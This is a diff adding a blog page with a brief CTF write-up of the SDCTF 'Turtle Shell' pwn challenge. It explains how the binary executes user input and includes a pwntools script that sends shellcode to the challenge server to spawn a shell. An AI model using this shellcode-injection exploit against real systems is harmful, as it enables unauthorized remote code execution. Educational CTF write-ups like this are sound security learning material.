@@ -1,0 +1,296 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <title>
+  Turtle Shell · fliqqs
+</title>
+  <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="color-scheme" content="light dark">
+
+
+
+
+<meta name="author" content="Fliqqs">
+<meta name="description" content="Turtle Shell  Link to heading   For this challenge we are told to coerce a turtle to come out of its shell.
+Poking around in ghidra we can see that our user input is taken and put in a buffer strstr is done against our input to check if bad is inside it. Then what is in the buffer is executed.
+This looks a little strange so I decided to have a poke around using gdb.">
+<meta name="keywords" content="blog,developer,personal">
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Turtle Shell"/>
+<meta name="twitter:description" content="Turtle Shell  Link to heading   For this challenge we are told to coerce a turtle to come out of its shell.
+Poking around in ghidra we can see that our user input is taken and put in a buffer strstr is done against our input to check if bad is inside it. Then what is in the buffer is executed.
+This looks a little strange so I decided to have a poke around using gdb."/>
+
+<meta property="og:title" content="Turtle Shell" />
+<meta property="og:description" content="Turtle Shell  Link to heading   For this challenge we are told to coerce a turtle to come out of its shell.
+Poking around in ghidra we can see that our user input is taken and put in a buffer strstr is done against our input to check if bad is inside it. Then what is in the buffer is executed.
+This looks a little strange so I decided to have a poke around using gdb." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="http://www.example.com/posts/turtleshell/turtleshell/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2023-05-05T16:56:10+10:00" />
+<meta property="article:modified_time" content="2023-05-05T16:56:10+10:00" />
+
+
+
+
+
+<link rel="canonical" href="http://www.example.com/posts/turtleshell/turtleshell/">
+
+
+<link rel="preload" href="/fonts/forkawesome-webfont.woff2?v=1.2.0" as="font" type="font/woff2" crossorigin>
+
+
+  
+  
+  <link rel="stylesheet" href="/css/coder.min.65236a6d834b26194eed04a2a3b45e44d9194ef9e620253705d4bef03bd7ef81.css" integrity="sha256-ZSNqbYNLJhlO7QSio7ReRNkZTvnmICU3BdS&#43;8DvX74E=" crossorigin="anonymous" media="screen" />
+
+
+
+
+
+
+  
+    
+    
+    <link rel="stylesheet" href="/css/coder-dark.min.f6534b0b446b75d9b6ad77a97d43ede2ddaeff1b6e2361fb7198d6f8fcb7f83f.css" integrity="sha256-9lNLC0Rrddm2rXepfUPt4t2u/xtuI2H7cZjW&#43;Py3&#43;D8=" crossorigin="anonymous" media="screen" />
+  
+
+
+
+ 
+
+
+
+
+<link rel="icon" type="image/png" href="/img/favicon-32x32.png" sizes="32x32">
+<link rel="icon" type="image/png" href="/img/favicon-16x16.png" sizes="16x16">
+
+<link rel="apple-touch-icon" href="/images/apple-touch-icon.png">
+<link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+
+<link rel="manifest" href="/site.webmanifest">
+<link rel="mask-icon" href="/images/safari-pinned-tab.svg" color="#5bbad5">
+
+
+
+
+
+
+
+
+
+</head>
+
+
+
+
+
+
+<body class="preload-transitions colorscheme-dark">
+  
+<div class="float-container">
+    <a id="dark-mode-toggle" class="colorscheme-toggle">
+        <i class="fa fa-adjust fa-fw" aria-hidden="true"></i>
+    </a>
+</div>
+
+
+  <main class="wrapper">
+    <nav class="navigation">
+  <section class="container">
+    <a class="navigation-title" href="/">
+      fliqqs
+    </a>
+    
+      <input type="checkbox" id="menu-toggle" />
+      <label class="menu-button float-right" for="menu-toggle">
+        <i class="fa fa-bars fa-fw" aria-hidden="true"></i>
+      </label>
+      <ul class="navigation-list">
+        
+          
+            <li class="navigation-item">
+              <a class="navigation-link" href="/posts/">Blog</a>
+            </li>
+          
+        
+        
+      </ul>
+    
+  </section>
+</nav>
+
+
+    <div class="content">
+      
+  <section class="container post">
+    <article>
+      <header>
+        <div class="post-title">
+          <h1 class="title">
+            <a class="title-link" href="http://www.example.com/posts/turtleshell/turtleshell/">
+              Turtle Shell
+            </a>
+          </h1>
+        </div>
+        <div class="post-meta">
+          <div class="date">
+            <span class="posted-on">
+              <i class="fa fa-calendar" aria-hidden="true"></i>
+              <time datetime="2023-05-05T16:56:10&#43;10:00">
+                May 5, 2023
+              </time>
+            </span>
+            <span class="reading-time">
+              <i class="fa fa-clock-o" aria-hidden="true"></i>
+              2-minute read
+            </span>
+          </div>
+          
+          
+          <div class="tags">
+  <i class="fa fa-tag" aria-hidden="true"></i>
+    <span class="tag">
+      <a href="/tags/sdctf/">SDCTF</a>
+    </span>
+      <span class="separator">•</span>
+    <span class="tag">
+      <a href="/tags/pwn/">pwn</a>
+    </span></div>
+
+        </div>
+      </header>
+
+      <div class="post-content">
+        
+        <h3 id="turtle-shell">
+  Turtle Shell
+  <a class="heading-link" href="#turtle-shell">
+    <i class="fa fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h3>
+<p>For this challenge we are told to coerce a turtle to come out of its shell.</p>
+<p><img src="/images/turtleshell/shell.png" alt="shell"></p>
+<p>Poking around in ghidra we can see that our user input is taken and put in a buffer <code>strstr</code> is done against our input to check if <code>bad</code> is inside it. Then what is in the buffer is executed.</p>
+<p><img src="/images/turtleshell/main.png" alt="webpage"></p>
+<p>This looks a little strange so I decided to have a poke around using gdb.</p>
+<p><img src="/images/turtleshell/gdb.png" alt="webpage"></p>
+<p>The line in ghidra <code>(*local)();</code> results in the <code>call rdx</code> instruction where <code>$rdx</code> is our input.</p>
+<p>Here was where I strugged, I could see that this program was vulnerable but I wasnt sure how to exploit it. Could we hand it a function pointer? After scratching my head for a while and consulting with a teammate he knew we should put some shellcode in their. pwn tools has just the thing we need and are able to get a shell using.</p>
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>  <span style="color:#fff;font-weight:bold">from</span> pwn <span style="color:#fff;font-weight:bold">import</span> *
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  elf = ELF(<span style="color:#0ff;font-weight:bold">&#39;./turtle-shell&#39;</span>)
+</span></span><span style="display:flex;"><span>  context.arch = <span style="color:#0ff;font-weight:bold">&#39;amd64&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#fff;font-weight:bold">def</span> start():
+</span></span><span style="display:flex;"><span>      <span style="color:#fff;font-weight:bold">return</span> remote(<span style="color:#0ff;font-weight:bold">&#39;turtle.sdc.tf&#39;</span>, <span style="color:#ff0;font-weight:bold">1337</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  io = start()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  payload = flat([asm(shellcraft.amd64.linux.sh())])
+</span></span><span style="display:flex;"><span>  io.sendline(payload)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  io.interactive()
+</span></span></code></pre></div><p>For me I was scratching my head as to how the shellcode was told to execute given we had some text in a buffer. Normally the call function looks something like <code>call 0x40005</code> a pointer to system. But instead we have <code>call &lt;a_pointer_to_the_start_of_our_buffer&gt;</code> and the contents of our buffer is executed.</p>
+
+      </div>
+
+
+      <footer>
+        
+
+
+        <div id="disqus_thread"></div>
+<script>
+  window.disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "yourdiscussshortname" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+    
+    document.addEventListener('themeChanged', function (e) { 
+        if (document.readyState == 'complete') {
+          DISQUS.reset({ reload: true, config: disqus_config });
+        }
+    });
+</script>
+        
+        
+        
+      </footer>
+    </article>
+
+    
+  </section>
+
+    </div>
+
+    <footer class="footer">
+  <section class="container">
+    ©
+    
+    2023
+     Fliqqs 
+    ·
+    
+    Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> & <a href="https://github.com/luizdepra/hugo-coder/" target="_blank" rel="noopener">Coder</a>.
+    
+  </section>
+</footer>
+
+  </main>
+
+  
+
+  
+  
+  <script src="/js/coder.min.6ae284be93d2d19dad1f02b0039508d9aab3180a12a06dcc71b0b0ef7825a317.js" integrity="sha256-auKEvpPS0Z2tHwKwA5UI2aqzGAoSoG3McbCw73gloxc="></script>
+  
+
+  
+
+  
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+</body>
+
+</html>
